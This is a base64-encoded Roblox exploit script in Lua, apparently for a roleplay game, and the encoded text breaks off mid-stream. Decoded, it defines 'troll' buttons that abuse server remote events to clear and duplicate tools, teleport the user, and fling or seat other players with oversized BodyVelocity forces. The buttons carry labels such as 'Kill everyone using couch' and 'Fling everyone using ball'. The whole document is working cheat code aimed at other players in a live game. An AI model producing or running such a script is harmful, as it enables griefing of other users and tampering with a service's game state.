cHJpbnQoIkJyaW5nIEFsbCBDb3VjaCBidXR0b24gY3JlYXRlZCIpCgpUcm9sbDpBZGRCdXR0b24oewogICAgTmFtZSA9ICJLaWxsIGV2ZXJ5b25lIHVzaW5nIGNvdWNoIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICBbMV0gPSAiQ2xlYXJBbGxUb29scyIKfQoKZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUkUiKTpXYWl0Rm9yQ2hpbGQoIjFDbGVhMXJUb29sMXMiKTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKCndhaXQoMC4yKQoKbG9jYWwgaW5pdGlhbFBvc2l0aW9uID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uCgpsb2NhbCBwYXJ0ID0gSW5zdGFuY2UubmV3KCJQYXJ0IikKcGFydC5TaXplID0gVmVjdG9yMy5uZXcoNTAwMCwgMTAsIDUwMDApCnBhcnQuUG9zaXRpb24gPSBWZWN0b3IzLm5ldygwLCAtNTAwLCAwKQpwYXJ0LkFuY2hvcmVkID0gdHJ1ZQpwYXJ0LkNhbkNvbGxpZGUgPSB0cnVlCnBhcnQuUGFyZW50ID0gZ2FtZS5Xb3Jrc3BhY2UKdGFzay53YWl0KCkKZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoMCwgLTUwMCwgMCkKd2FpdCgyKQp0b29sc2VsY3RlZCA9ICJDb3VjaCIKZHVwZWFtb3QgPSAyNSAtLSBkdXBlIGFtb3VudApwaWNrdG9vbHJlbW90ZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIikKY2xlYXJ0b29scmVtb3RlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxQ2xlYTFyVG9vbDFzIikKZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIse1RpdGxlPSJEdXBpbmciLFRleHQ9IuKaoO+4j++4sURvbid0IGNsaWNrIGFueXRoaW5nLiIsIEJ1dHRvbjEgPSAiQWxyaWdodCIgLER1cmF0aW9uPTV9KQpnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIix7VGl0bGU9IkR1cGluZyIsVGV4dD0iV2FpdC4uLiIsIEJ1dHRvbjEgPSAiT2siICxEdXJhdGlvbj01fSkKZHVwaW5nID0gdHJ1ZQpvbGRjZiA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZSB0aGVuCiAgICB0YXNrLndhaXQoKQogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPSBmYWxzZQplbmQKd2FpdCgwLjEpCmlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKQplbmQKZm9yIG09MSwyIGRvIAogICAgdGFzay53YWl0KCkKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDk5OTk5OTk5OS40MTQsIC00OTAsIDk5OTk5OTk5OS40MTQsIDAuOTc0MzYwNDA2LCAtMC4xNzU3MzQwODgsIDAuMTQwNDk3NjEsIC0wLjEzMzQ0MTQwNCwgMC4wNTE0MDUzMDY5LCAwLjk4OTcyMjcyOSwgLTAuMTgxMTUwMzAyLCAtMC45ODMwOTQ2OTIsIDAuMDI2NjM3MDkyMikKZW5kCnRhc2sud2FpdCgwLjIpCmdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IHRydWUKd2FpdCgwLjUpCmZvciBhaWRqLGFmaCBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIGFmaC5OYW1lID09IHRvb2xzZWxjdGVkID09IGZhbHNlIHRoZW4KICAgICAgICBpZiBhZmg6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICBhZmguUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCmZvciBhaWVmaGlld2h3ZixkdmpidmogaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIGR2amJ2ajpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgaWYgZHZqYnZqLk5hbWUgPT0gdG9vbHNlbGN0ZWQgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICBkdmpidmo6RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCmZvciB0dGp0anV0anV0amp0aixkZHZkdmRzdmRmYnJueXR5dG12ZHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICBpZiBkZHZkdmRzdmRmYnJueXR5dG12ZHY6SXNBKCJUb29sIikgdGhlbgogICAgICAgIGlmIGRkdmR2ZHN2ZGZicm55dHl0bXZkdi5OYW1lID09IHRvb2xzZWxjdGVkID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgZGR2ZHZkc3ZkZmJybnl0eXRtdmR2OkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgZW5kCmVuZApmb3IgZmluZGluLHRvb2xsZWwgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICBpZiB0b29sbGVsOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICBpZiB0b29sbGVsLk5hbWUgPT0gdG9vbHNlbGN0ZWQgdGhlbgogICAgICAgICAgICB0b29sbGxsZm91bjIgPSB0cnVlCiAgICAgICAgICAgIGZvciBiYXNjLGFpamZ3IGluIHBhaXJzKHRvb2xsZWw6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgIGlmIGFpamZ3Lk5hbWUgPT0gIkhhbmRsZSIgdGhlbgogICAgICAgICAgICAgICAgICAgIGFpamZ3Lk5hbWUgPSAiSMOiIMKlYcOiIMKlbsOiIMKlZMOiIMKlbMOiIMKlZSIKICAgICAgICAgICAgICAgICAgICB0b29sbGVsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgIHRvb2xsZWwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgIHRvbGxsbGFoaGhoID0gdG9vbGxlbAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZSAKICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgICAgICBlbmQKICAgIGVuZAplbmQKZm9yIGZpaWZpLHRvb2xsbGwgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIHRvb2xsbGw6SXNBKCJUb29sIikgdGhlbgogICAgICAgIGlmIHRvb2xsbGwuTmFtZSA9PSB0b29sc2VsY3RlZCB0aGVuCiAgICAgICAgICAgIHRvb2xsbGxmb3VuID0gdHJ1ZQogICAgICAgICAgICBmb3IgbmFuYSxqanNqc2ogaW4gcGFpcnModG9vbGxsbDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgaWYgampzanNqLk5hbWUgPT0gIkhhbmRsZSIgdGhlbgogICAgICAgICAgICAgICAgICAgIHRvb2xsbGwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgIGpqc2pzai5OYW1lID0gIkjDoiDCpWHDoiDCpW7DoiDCpWTDoiDCpWzDoiDCpWUiCiAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICB0b29sbGxmZmVsID0gdG9vbGxsbAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVsc2UgCiAgICAgICAgICAgIHRvb2xsbGxmb3VuID0gZmFsc2UKICAgICAgICBlbmQKICAgIGVuZAplbmQKaWYgdG9vbGxsbGZvdW4gPT0gdHJ1ZSB0aGVuCiAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xsbGZmZWwpID09IG5pbCB0aGVuIAogICAgICAgIHRvb2xsbGxmb3VuID0gZmFsc2UgCiAgICBlbmQKICAgIHJlcGVhdCAKICAgICAgICB3YWl0KCkgCiAgICB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xsbGZmZWwpID09IG5pbAogICAgdG9vbGxsbGZvdW4gPSBmYWxzZQplbmQKaWYgdG9vbGxsbGZvdW4yID09IHRydWUgdGhlbgogICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b2xsbGxhaGhoaCkgPT0gbmlsIHRoZW4gCiAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UgCiAgICBlbmQKICAgIHJlcGVhdCAKICAgICAgICB3YWl0KCkgCiAgICB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvbGxsbGFoaGhoKSA9PSBuaWwKICAgIHRvb2xsbGxmb3VuMiA9IGZhbHNlCmVuZAp3YWl0KDAuMSkKZm9yIG09MSwgZHVwZWFtb3QgZG8KICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIAogICAgICAgIHJldHVybiAKICAgIGVuZAogICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKSAKICAgIGVuZAogICAgaWYgbSA8PSBkdXBlYW1vdCB0aGVuCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIse1RpdGxlPSJEdXBlIEluZm9ybWF0aW9uIixUZXh0PSJOb3cgeW91IGhhdmUiLi4iICIuLm0uLiIgIi4uIkR1cGVkIi4uIiAiLi50b29sc2VsY3RlZC4uIiEiLER1cmF0aW9uPTAuNX0pCiAgICBlbHNlaWYgbSA9PSBkdXBlYW1vdCBvciBtID49IGR1cGVhbW90IC0gMSB0aGVuCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIse1RpdGxlPSJEdXBlIEluZm9ybWF0aW9uIixUZXh0PSJOb3cgeW91IGhhdmUiLi4iICIuLm0uLiIgIi4uIkR1cGVkIi4uIiAiLi50b29sc2VsY3RlZC4uIiEiLi4iICIuLiJUb29scyBhcmUgYmVpbmcgZHVwZWQsIGRvbid0IGNsaWNrIGFueXRoaW5nLiIsRHVyYXRpb249NH0pCiAgICBlbmQKICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgWzFdID0gIlBpY2tpbmdUb29scyIsCiAgICAgICAgWzJdID0gdG9vbHNlbGN0ZWQKICAgIH0KCiAgICBwaWNrdG9vbHJlbW90ZTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKSAKICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOldhaXRGb3JDaGlsZCh0b29sc2VsY3RlZCkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlciAKICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIAogICAgICAgIHJldHVybiAKICAgIGVuZCAKICAgIHdhaXQoKSAKICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlclt0b29sc2VsY3RlZF06RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpLk5hbWUgPSAiSMOiIMKlYcOiIMKlbsOiIMKlZMOiIMKlbMOiIMKlZSIgCiAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjayAKICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKHRvb2xzZWxjdGVkKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIAogICAgcmVwZWF0IAogICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4gCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKSAKICAgICAgICBlbmQgCiAgICAgICAgdGFzay53YWl0KCkgCiAgICB1bnRpbCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpID09IG5pbCAKZW5kIApnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZSAKcmVwZWF0IAogICAgd2FpdCgpIAp1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgPT0gbmlsIApyZXBlYXQgCiAgICB3YWl0KCkgCnVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSAKZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IG9sZGNmIAp3YWl0KCkgCmR1cGluZyA9IGZhbHNlIApmb3Igd3dlZmVmLHdlaWZ3d2UgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8gCiAgICBpZiB3ZWlmd3dlLk5hbWUgPT0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLk5hbWUgPT0gZmFsc2UgdGhlbiAKICAgICAgICBld29pZmp3b2lmaml3byA9IHd3ZWZlZiAKICAgIGVuZCAKZW5kIApmb3IgbT0xLGV3b2lmandvaWZqaXdvIGRvIAogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrLkNvdWNoLk5hbWUgPSAiQ2hhb3MgQ291Y2giLi5tIAplbmQgCndhaXQoKSAKZm9yIHdlb2ZlZmF3ZCxpd2llamd1aXdnIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbyAKICAgIGlmIGl3aWVqZ3Vpd2cuTmFtZSA9PSAiQ2hhb3MgQ291Y2giLi53ZW9mZWZhd2QgdGhlbiAKICAgICAgICBpd2llamd1aXdnLkhhbmRsZS5OYW1lID0gIkhhbmRsZSAiIAogICAgZW5kIAplbmQgCndhaXQoMC4yKSAKbG9jYWwgZnVuY3Rpb24gYnJpbmcoc2tqZGZ1d2lydXdnLHdvaWVqZXdnKSAKICAgIGlmIHdvaWVqZXdnID09IG5pbCA9PSBmYWxzZSB0aGVuIAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1siQ2hhb3MgQ291Y2giLi5za2pkZnV3aXJ1d2ddOkZpbmRGaXJzdENoaWxkKCJTZWF0MSIpLkRpc2FibGVkID0gdHJ1ZSAKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbIkNoYW9zIENvdWNoIi4uc2tqZGZ1d2lydXdnXTpGaW5kRmlyc3RDaGlsZCgiU2VhdDIiKS5EaXNhYmxlZCA9IHRydWUgCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrWyJDaGFvcyBDb3VjaCIuLnNramRmdXdpcnV3Z10uUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlciAKICAgICAgICB0ZXQgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbIkNoYW9zIENvdWNoIi4uc2tqZGZ1d2lydXdnXTpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlICIpKSAKICAgICAgICB0ZXQuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsbWF0aC5odWdlLG1hdGguaHVnZSkgCiAgICAgICAgdGV0LlAgPSAxMjUwIAogICAgICAgIHRldC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKSAKICAgICAgICB0ZXQuTmFtZSA9ICIjbU9WT09FUEYkI0BGJCNHRVJFLi4+Vjw8PDxFVzxWPDxXIiAKICAgICAgICByZXBlYXQgCiAgICAgICAgICAgIGZvciBtPTEsMzUgZG8gCiAgICAgICAgICAgICAgICBsb2NhbCBwb3MgPSB7eD0wLCB5PTAsIHo9MH0gCiAgICAgICAgICAgICAgICBwb3MueCA9IHdvaWVqZXdnLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uLlggCiAgICAgICAgICAgICAgICBwb3MueSA9IHdvaWVqZXdnLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uLlkgCiAgICAgICAgICAgICAgICBwb3MueiA9IHdvaWVqZXdnLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uLlogCiAgICAgICAgICAgICAgICBwb3MueCA9IHBvcy54ICsgd29pZWpld2cuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuVmVsb2NpdHkuWCAvIDIgCiAgICAgICAgICAgICAgICBwb3MueSA9IHBvcy55ICsgd29pZWpld2cuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuVmVsb2NpdHkuWSAvIDIgCiAgICAgICAgICAgICAgICBwb3MueiA9IHBvcy56ICsgd29pZWpld2cuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuVmVsb2NpdHkuWiAvIDIgCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyWyJDaGFvcyBDb3VjaCIuLnNramRmdXdpcnV3Z106RmluZEZpcnN0Q2hpbGQoIlNlYXQxIikuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhWZWN0b3IzLm5ldyhwb3MueCxwb3MueSxwb3MueikpICogQ0ZyYW1lLm5ldygtMiwyLDApIAogICAgICAgICAgICAgICAgdGFzay53YWl0KCkgCiAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlclsiQ2hhb3MgQ291Y2giLi5za2pkZnV3aXJ1d2ddLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjayAKICAgICAgICAgICAgd2FpdCgpIAogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbIkNoYW9zIENvdWNoIi4uc2tqZGZ1d2lydXdnXTpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlICIpLk5hbWUgPSAiSGFuZGxlIiAKICAgICAgICAgICAgd2FpdCgwLjIpIAogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbIkNoYW9zIENvdWNoIi4uc2tqZGZ1d2lydXdnXS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIAogICAgICAgICAgICB3YWl0KCkgCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbIkNoYW9zIENvdWNoIi4uc2tqZGZ1d2lydXdnXS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sgCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1siQ2hhb3MgQ291Y2giLi5za2pkZnV3aXJ1d2ddLkhhbmRsZS5OYW1lID0gIkhhbmRsZSAiIAogICAgICAgICAgICB3YWl0KDAuMikgCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1siQ2hhb3MgQ291Y2giLi5za2pkZnV3aXJ1d2ddLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIgCiAgICAgICAgICAgIHRldCA9IEluc3RhbmNlLm5ldygiQm9keVZlbG9jaXR5IiwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlclsiQ2hhb3MgQ291Y2giLi5za2pkZnV3aXJ1d2ddOkZpbmRGaXJzdENoaWxkKCJTZWF0MSIpKSAKICAgICAgICAgICAgdGV0Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLG1hdGguaHVnZSxtYXRoLmh1Z2UpIAogICAgICAgICAgICB0ZXQuUCA9IDEyNTAgCiAgICAgICAgICAgIHRldC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKSAKICAgICAgICAgICAgdGV0Lk5hbWUgPSAiI21PVk9PRVBGJCNARiQjR0VSRS4uPlY8PDw8RVc8Vjw8VyIgCiAgICAgICAgdW50aWwgd29pZWpld2cuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIAogICAgICAgIHdhaXQoKSAKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyWyJDaGFvcyBDb3VjaCIuLnNramRmdXdpcnV3Z106RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSAiKTpGaW5kRmlyc3RDaGlsZCgiI21PVk9PRVBGJCNARiQjR0VSRS4uPlY8PDw8RVc8Vjw8VyIpOkRlc3Ryb3koKSAKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyWyJDaGFvcyBDb3VjaCIuLnNramRmdXdpcnV3Z10uUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrIAogICAgICAgIHdhaXQoKSAKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbIkNoYW9zIENvdWNoIi4uc2tqZGZ1d2lydXdnXTpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlICIpLk5hbWUgPSAiSGFuZGxlIiAKICAgICAgICB3YWl0KDAuMikgCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrWyJDaGFvcyBDb3VjaCIuLnNramRmdXdpcnV3Z10uUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlciAKICAgICAgICB3YWl0KCkgCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlclsiQ2hhb3MgQ291Y2giLi5za2pkZnV3aXJ1d2ddLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjayAKICAgIGVuZCAKZW5kIApmb3IgbXdlZix3ZXVlcmcgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8gCiAgICBpZiB3ZXVlcmcuTmFtZSA9PSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZSA9PSBmYWxzZSB0aGVuIAogICAgICAgIHNwYXduKGZ1bmN0aW9uKCkgYnJpbmcobXdlZix3ZXVlcmcpIGVuZCkgCiAgICBlbmQgCmVuZCAKCi0tIEZ1bmN0aW9uIHRvIHRlbGVwb3J0IHRoZSBwbGF5ZXIgYmFjayB0byB0aGUgaW5pdGlhbCBwb3NpdGlvbiBhZnRlciAxMCBzZWNvbmRzCnRhc2suZGVsYXkoMTQsIGZ1bmN0aW9uKCkKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KGluaXRpYWxQb3NpdGlvbikKZW5kKQoKLS0gRnVuY3Rpb24gdG8gY2xlYXIgYWxsIHRvb2xzIDAuNSBzZWNvbmRzIGFmdGVyIHRlbGVwb3J0aW5nIHRvIHRoZSBpbml0aWFsIHBvc2l0aW9uCnRhc2suZGVsYXkoMTQuMSwgZnVuY3Rpb24oKQogICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUkUiKTpXYWl0Rm9yQ2hpbGQoIjFDbGVhMXJUb29sMXMiKTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKZW5kKQogICAgZW5kCn0pCnByaW50KCJLaWxsIEFsbCBDb3VjaCBidXR0b24gY3JlYXRlZCIpICAKClRyb2xsOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkZsaW5nIGV2ZXJ5b25lIHVzaW5nIGJhbGwiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvY2FsIHBsYXllcj1nYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgpsb2NhbCBTb2NjZXJCYWxscz13b3Jrc3BhY2UuV29ya3NwYWNlQ29tWyIwMDFfU29jY2VyQmFsbHMiXQpsb2NhbCBNeUJhbGw9U29jY2VyQmFsbHM6RmluZEZpcnN0Q2hpbGQoIlNvY2NlciIuLnBsYXllci5OYW1lKQoKaWYgbm90IE15QmFsbCB0aGVuCmlmIG5vdCBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlNvY2NlckJhbGwiKSB0aGVuCmxvY2FsIGFy